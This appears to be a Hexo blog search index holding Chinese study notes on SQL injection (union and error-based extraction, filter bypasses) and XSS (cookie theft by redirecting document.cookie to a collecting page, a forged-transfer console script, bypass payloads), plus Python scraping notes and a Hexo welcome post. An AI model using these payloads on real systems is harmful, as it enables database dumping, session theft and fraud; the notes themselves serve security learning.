<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[SQL总结(一)_Union回显+报错注入]]></title>
      <url>%2F2017%2F11%2F27%2Funion%E5%9B%9E%E6%98%BE_%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
      <content type="text"><![CDATA[MYSQL的爆数据顺序： &gt;1.show databases;（一个MYSQL中有多少个数据库） use xxx（其中一个数据库）&gt;2.show tables; (xxx这个数据库中所有的表) select * from xxa（xxa为xxx数据库中的一个表）&gt;3.查看表中的所有信息[包括多少列（每行不同的属性 id、username等属性）、多少行（多少条数据）]注入类型的判断:&gt;1.字符型SQL注入：SQL语句执行的过程中被单引号，或者双引号，或者括号等包起来，其实就是在SQL语句执行的过程中，这个id参数被当做是字符类型的数据来进行处理。&gt;2.数字型SQL注入：没有’’等包起来在平台的注入中，单单用’来确定有没有注入点是不对的，因为不同的平台使用的查询语句都不相同，所以各种符号都要进行尝试。#### 1.确认是否有注入点 ## 1&gt;’报错 2&gt;id=1 and 1=1 正常 3&gt;id=1 and 1=2 报错## 2.寻找注入点 ## 1&gt;确认要爆的表有多少列 id=1’ order by %d –+正常则有，报错则没有该字段了(一般为3） order by 即有多少列名（属性：id、username等） 2&gt;确认有没有过滤特殊字符 id=1’union select 1 from 1 where 1=1 若报错，那么union select from where 中有被过滤的元素（可能不止一个） 3&gt;绕过过滤 a.用ASCII码的非打印字符绕过关键字的过滤（例如：%0c、%0b） b.用大小字母作转换（例如：union -&gt; uniOn） c.若为全过滤，进行重复过滤（例如：union -&gt; uniUNIONon） d.其中一个字母换位ASCII码 （例如：from -&gt; f&#114;om） e.逗号可以用join代替 空格可以用%0a 双引号可用16进制转换 4&gt;爆数据库 4.1&gt;id=1’union select 1,schema_name,3 from information_schema.schemata limit 1,2 – 4.2&gt;?id=0’ union select 1,2,3 –+ //看看爆1,2,3哪一个在屏幕中有回显..在有的那个那里，替换为database() version()等都可以爆出相应想要的东西 limit 0,1 -&gt; 得到前1条信息（得到第1行信息） limit 0,2 -&gt; 得到前2条信息 limit 1,2 -&gt; 得到第2行信息 limit 2,3 -&gt; 得到第3行信息 union select 1,2,3 （有三列，第一列一般为id 第二列一般为username，第三列一般为passwd等） 获取第二列中的信息（也就是库表的名字）-&gt; schema_name limit 0,1 -&gt; 第一个数据库 limit 1,2 -&gt; 第二个数据库 limit 2,3 -&gt; 第三个数据库 5&gt;爆数据表 id=1’ union select 1,table_name,3 from information_schema = (select database()) limit 0,1 –+ ?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’当前数据库’ –+ 不止一个表的时候，要用group_concat（） infromation_schema = (select database()) //use database(xxx) (选择的数据库) table_name 就是所选择的数据库（select database()）中所有表的名字 limit 0,1就是选择第一个表（一次类推）6&gt;爆数据（字段名） id=1’ union select 1,column_name,3 from information_schema.columns where table_schema=(select database()) limit 0,1 id=0’union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’当前数据库’and table_name=’当前表名’ –+ 可以不使用limit 0，1 (一行一行的发现数据库、数据表、数据） 使用group_concat (一次性爆出所有的数据库和数据表) &gt;6.1爆数据表 ?id=1’ union select 1,group_concat(table_name),3 from infromation_schema.tables where table_schema=’数据库名字’ –+ (分号用于闭合前面的’） &gt;6.2爆数据 ?id=1’ union select 1,group_concat(username),group_concat(password) from 数据表 –+ group_concat() 计算那些行属于同一组，列出来## 3.基于错误 ## 1.基于id的错误来爆出信息 id=&apos;负数&apos; union select 5,version(),3 and 1 id一定要为负，如果为正，那么login会查询到数据表中相应数字的数据 union select 后面的数字可以随意.. and 1(数字型）、and &amp;lsquo;1(单引号）来代替#、+等注释符号 id==&apos;负数&apos; union select 2,current_user,3 and &amp;lsquo;1 2.使用大量错误信息获取数据 1.select database() //显示当前数据库 select count(*) from information_schema.tables;//一共有多少行(例如显示数据为：203） 2.select concat(0x3a,0x3a,(select database()),0x3a,0x3a)//查询当前数据库联结输出（::数据库::） 0x3a在表中体现为空 通过分号分隔开 3.select concat(0x3a,0x3a,(select database()),0x3a,0x3a)a //a为输出的联结（::数据库::） 4.选择当前的数据库来添加多个表的联结输出 select concat(0x3a,0x3a(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables; （对应1中的每一行对应一个输出联结） 5.选择当前的数据库来添加多个数据的联结输出 select concat(0x3a,0x3a(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns; 多试几次，当随机数字重复的时候，会得到错误信息，错误信息会有返回值，返回值中可以看到数据库的名字被显示出来 3.爆表 1.爆库名 select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a; 2.爆版本名 select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a; 3. 第一步 1&apos;) and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a)# 第二步 1&apos;) and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a))# 第三步 1&apos;) and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a)b)# 4.除了floor()函数外，还有updatexml()、extractvalue()也有同样的功能updatexml() 1&apos;) and (updatexml(1,concat(0x3a,0x3a,(select database()),0x3a,0x3a),1))# 1&apos;) and (extractvalue(1,concat(0x3a,0x3a,(select database()),0x3a,0x3a)))#]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[xss攻击类型和方式]]></title>
      <url>%2F2017%2F11%2F26%2Fxss%E8%AF%95%E9%AA%8C%2F</url>
      <content type="text"><![CDATA[&gt; 攻击： 1.盗取用户账号 2.非法转账 3.篡改系统信息 4.网站挂马 - 盗取用户账号 var cookie = document.cookie window.location.href = &apos;http://127.0.0.1/index.php?cookie=&apos;+cookie; 使用document对象里面的cookie属性去获得浏览器里的cookie值使用window.location下面的href属性，赋值。使得浏览器跳转到127.0.0.1下面的index.php页面中，把拿到的cookie值也传递到页面中。 - 1.如何获得cookie值 a.在resource的cookie中 b.在控制台consle中输入document.cookie查看cookie值 - 2.获得cookie值如何盗取用户账号 在用户登录的时候，用户的用户名和密码会被传送至服务器端，服务器做校验，若没有问题，就会产生一个文件，文件名被转换成相应的字符串，当服务器发生响应的时候，该字符串会被携带上并且一同被存储到cookie中。同时再次响应的时候会根据cookie的值寻找该文件，取得该文件后就知道是哪个用户请求登陆。 若在我们登陆的时候携带上别人的cookie，就能找到别人的文件，就可以通过cookie数据成功模拟别人的数据操控系统。 - 3.获取cookie数据 cookie数据被送到了index.php文件，然后该文件将cookie的值都存入了cookie.txt文件中(然而里面一般没有登录的cookie数据，由于我们要获取的是httponly cookie，若cookie为httponly则无法通过JS读取该cookie的值) 当我们刷新页面的时候，会重新提交cookie，若能拿到请求数据，就可以获得cookie的数据。用Network(用于监听浏览器和服务器之间的数据)获取请求数据 - 4.获取用户信息 a.在控制台中更改cookie信息(将现在的cookie信息重新赋值为从network中获取到的cookie信息) b.刷新，进入页面，获取了权限 - 非法转账 在consloe中输入: document.getElementById(&apos;ipt-search-key&apos;).value = &apos;#收款人账号&apos;; document.getElementById(&apos;amount&apos;).value = &apos;#金额&apos;; document.getElementById(&apos;reason&apos;).value = &apos;#支付说明&apos;; document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认按钮 - 如何注入代码到页面中（xss之后台注入） 当别人打开自己的后台界面的时候（自己提交的数据只有自己能看得到，也就是并不是一个公共的平台）若往后台界面注入JS代码那么被注入的也是自己，所以此时要使用反射性xss攻击。 - - - - - xss攻击的几种方式 -1.基本上没有过滤符号（’&lt;’ ‘&gt;’） 在url栏上输入，打开html的源代码，如果能看到在url上的输入，即也能看到输出即输入输出都没有过滤 →插入代码 2.输出在之间的情况 特点：1.仍然是输入输出均可见，即都没有过滤 2.输出在源代码中在中间 - 解法：1.判断是否过滤符号&lt; &gt; /等若没有过滤，直接构造‘输入’源代码→ script&gt;alert(1)如果经过过滤：1.1 通过JS构造 → eval（’alter(1)’）;void 3.输出在HTML属性里的情况 案例一：&lt;input value=&quot;输出&quot;&gt; 、 &lt;img onload=&quot;...[输出]...&quot;&gt; ，再比如 &lt;body style=&quot;...[输出]...&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; onclick=&quot;alert(1)&quot; /&gt;输入的是 乌云欢迎您” onclick=”alter(1) 前一个”与value=””的前双引号闭合，后一个与其后一个双引号闭合。但通常情况下会浏览器会过滤掉w我们输入的””号，过滤为#quot;但如果没有过滤’\’，同样可以过滤css中允许转义字符 +ascii 16 进制形式例如过滤了expression 可以用expr\65ssion绕过e 的 ascii 16 进制是 65, 我们就写为 \65 expression -&gt; expr\65ssion。 案例二：&lt;HTML 标签 onXXXX=&quot;...[输出在这里]..&quot;&gt; &lt;a href=&quot;javascript:[输出在这里]&quot;&gt;xxxx &lt;/a&gt;常规来说，因为 onxxxx=”[输出]” 和 href=”javascript:[输出]” 与 [输出] 没有太大区别。因为[输出]所在的地方，都是 javascript 脚本。但是[输出] 如果被过滤，往往没有太好的办法。 而上面这 2 种情况，则有一个很好的办法绕过过滤。只要上面的情况，没有过滤 &amp;，# 等符号，我们就可以写入任意字符 - 4.宽字节复仇记 通过注入”来闭合前面的双引号一般情况下，”会被过滤为&quot;如果是gbxxx系列的编码，则可以尝试一下宽字节&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb18030&quot; /&gt;“ 转移为%22http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0%22;alert(1);//aaaaaa 5.使用反斜线过滤 一般情况下，双引号会被过滤，但有时候\还可以使用使用//来注释掉后面的内容（即//后面的都被当成是注释）/**/可以代替空格 6.使用换行符，（在备注中）→ %0a]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[xss注入的基础知识]]></title>
      <url>%2F2017%2F11%2F26%2Fxss%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%2F</url>
      <content type="text"><![CDATA[#XSS注入基础知识# xss攻击是什么? 代码注入形式的一种安全漏洞攻击 通过注入恶意指令代码到网页，是用户执行攻击者所制造的恶意网页 攻击成功后，攻击者可能得到更高的用户权限 xss攻击的基本原理 在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击——将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。 xss的基本实现思路 通过在网页上发布评论，提交还有类似于JS或者html或者Java，VBScript，ActiveX，Flash的内容文本。时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。 xss的类型 反射性xss --被动的非持久性xss 通过点击带有攻击性的url链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。 持久型xss 主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。可以描述为:恶意用户的HTML或JS输入服务器-&gt;进入数据库-&gt;服务器响应时查询数据库-&gt;用户浏览器。 DOM-based XSS 基于DOM的XSS，通过对具体DOM代码进行分析，根据实际情况构造dom节点进行XSS跨站脚本攻击。注：domxss取决于输出位置，并不取决于输出环境，因此domxss既有可能是反射型的，也有可能是存储型的。dom-based与非dom-based，反射和存储是两个不同的分类标准。 转载自http://www.imooc.com/m/wap/article/detail.html?aid=13553 对于跨站脚本攻击（XSS攻击）的理解和总结]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[xss总结]]></title>
      <url>%2F2017%2F11%2F26%2FXSS%E6%80%BB%E7%BB%93%2F</url>
      <content type="text"><![CDATA[1.常用XSS注入标签 `&lt;img onerror=&quot;alert(document.domain)&quot; src=&gt; &lt;a href = javascript:alert(document.domain)&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt; javascript:alert(document.domain) onclick = alert(document.domain) onmouseover = alert(document.domain) /onfocus &lt;svg/onload = alert(document.domain)&gt;` 2.过滤字符常见的处理方法：a.中间再插入1个相同的字符[例如： 1.过滤了script → scrSCRIPTipt] b.改换大小写[例如： 1.过滤了script → scriPt] c.将其中一个数字改成Unicode编码[例如: 1.过滤script → sc&amp;#114;ipt] d.加注释符绕过[例如： 1.expression → expre/**/ssion] e.转换为16进制编码[例如： 1.script → sc%52ipt] f:全部转换为Unicode编码[例如： 1.过滤了alert &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; http://tool.chinaz.com/tools/unicode.aspx &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,10))&lt;/script&gt;] 4.常见的xss注入点 通过GET方法：（在URL中输入的参数显示在HTML中）a.在&lt;b&gt;或者&lt;p&gt;中 `&lt;img onerror=&quot;alert(document.domain);&quot; src=&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt; &lt;a href=javascript:alert(document.domain)&gt;` b.在&lt;input&gt;标签里面 ①逃出&lt; &gt; 例如: 原句：&lt;input name=&quot;t1&quot; value=&quot;&quot; type=&quot;text&quot;&gt; 变为：&lt;input name=&quot;t1&quot; value=&quot;&quot; type=&quot;text&quot;&gt;&lt;img onerror=&quot;alert(document.domain);&quot;src=&gt;&quot; type=&quot;text&quot;&gt; ②如果无法逃出value=””里的双引号 a.查看是否有hidden标签，如有： a1.看看在url中可不可以用GET方法修改hidden 标签的值 a2:用burp抓包，再修改值 b.利用特殊符号吃掉双引号（%A7） 宽字节注入 c.使用onclick onmouseover onfocus③有字数限制 用burp修改④转义了&lt;&gt; 可以用onclick在input中触发，使用onclick onmouseover c.类似于评论区的，可以提交自己的信息的 ①若没有过滤 在标签中插入onload事件，（自己创建一个可以放入xss的地方） &lt;img src=&quot;&quot; onerror=&quot;alert(&apos;xss&apos;)&quot;&gt; d.若页面转换照片通过url后面的参数来转换 e.使用了字母大小写的转换： toLocaleUpperCase 将字符串中所有的字母字符都将被转换为大写的，同时适应宿主环境的当前区域设置。 toUpperCase 将字符串中的所有字母都被转化为大写字母。 toLocaleLowerCase 将字符串所有的字母字符都被转换为小写，同时考虑到宿主环境的当前区域设置。 toLowerCase 将字符串中的字母被转换为小写字母。 toUpperCase(): ı ==&gt;I ſ ==&gt;S toLowerCase(): İ ==&gt;i K ==&gt;k]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[python爬虫的一些小知识点]]></title>
      <url>%2F2017%2F11%2F26%2Fpython%E7%88%AC%E8%99%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9%2F</url>
      <content type="text"><![CDATA[- 关于cookielib 1&gt;cookie:有一些网站在cookie未启用的时候无法浏览，而cookie是用于某些网站辨别用户身份，进行session跟踪而存储在 用户本地终端 上的数据（比如说有些网站需要登录后才能访问某个页面，在登录之前，你想抓取某个页面内容是不允许的。那么我们可以利用Urllib2库保存我们登录的Cookie，然后再抓取其他页面就达到目的了。） 2&gt;打开网页的console，刷新页面之后，在network中会有Request Headers，其中就有cookie 当我们(客户端）输入URL请求页面后，我们即给web服务端发送了一个要求（request），web server根据Request生产响应的response，发回给我们（客户端），然后解析Response的html，我们就可以看到页面 –当网站发送页面到客户端时（服务器发送给客户端），会发送Headers来描述HTTP事物，送回来的headers（response headers）中包含一些有cookie的文本。如果此时想要从相同的服务器返回其他页面（客户端请求其他页面），那么cookie就必须作为请求的handler（request handler）传送给服务器，这就意味着cookies会存储一些信息让服务器来识别你。 #其中一种获取网页的方式# cj =cookielib.CookieJar() opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) urllib2.install_opener(opener) response3 = urllib2.urlopen(url) print response3.getcode() print cj print response3.read() 关于CookieJar() cookielib.CookieJar用于存储cookie对象，此模块捕获cookie并在后续连接请教时重新发送，还可以用来处理包含cookie数据文件 关于opener和handlers 1&gt;opener:当你获取一个URL的时候，你就使用一个opener(一个urllib2.OpenerDirector的实例) 默认的opener也就是我们常用的urlopen。它是一个特殊的opener，传入的参数仅仅是url,data,timeout(可以注意到并没有cookie，说明在某些网页中无法使用这种方法抓取数据），如果我们需要用到cookie，就需要创建更一般的opener来实现对Cookie的设置 -自定义opener #使用build_opener() opener = urllib2.build_opener([handler1[handler2...]]) 参数handler是Handler实例，常用的有HTTPBasicAuthHandler、HTTPCookieProcessor、ProxyHandler等 ①修改http报头 import urllib2 opener = urllib2.build_opener() opener.addheaders = [(&apos;User-agent&apos;, &apos;Mozilla/5.0&apos;)] opener.open(url) ②install_opener(opener)安装不同的opener对象作为urlopen()使用的全局opener opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) urllib2.install_opener(opener) response3 = urllib2.urlopen(url) ③密码验证（HTTPBasicAuthHandler）HTTPBasicAuthHandler()处理程序可用add_password()来设置密码。 h.add_password(远程关联的名称,基URL,user,passwd) - import urllib2 auth=urllib2.HTTPBasicAuthHandler() auth.add_password(&apos;Administrator&apos;,&apos;http://www.example.com&apos;,&apos;Dave&apos;,&apos;123456&apos;) opener=urllib2.build_opener(auth) u=opener.open(URL) ④Cookie处理(HTTPCookieProcessor) import urllib2,cookielib cookie=cookielib.CookieJar() cookiehand=urllib2.HTTPCookieProcessor(cookie) opener=urllib2.build_opener(cookiehand) ⑤代理(ProxyHandler)-ProxyHandler(proxies)参数proxies是一个字典，将协议名称（http，ftp）等映射到相应代理服务器的URL。 proxy=ProxyHandler({&apos;http&apos;:&apos;http://someproxy.com:8080&apos;}) auth=HTTPBasicAuthHandler() auth.add_password() opener=build_opener(auth,proxy) - 实例爬虫 1.确定抓取的目标：-通过网页”检查元素”的操作可以确定该网页的url格式，数据格式和网页编码 2.分析目标 3.编写代码在一个包中写入：总程序调度文件、URL管理器文件、HTML下载器文件、HTML解析器文件、HTML输出器文件]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>%2F2017%2F11%2F26%2Fhello-world%2F</url>
      <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
    </entry>

    
  
  
</search>
